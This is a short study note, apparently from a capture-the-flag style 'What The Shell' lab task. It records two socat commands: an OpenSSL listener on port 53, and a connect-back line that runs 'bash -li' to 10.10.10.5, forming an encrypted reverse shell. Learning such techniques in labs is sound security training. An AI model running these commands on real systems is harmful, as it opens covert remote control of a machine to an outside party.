---
Tags: WhatTheShell
date: 07-09-2022
---

[Hacking](./Hacking.md)

---

Task 7 :
```
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0

this is to connect back to the listener
socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane

```

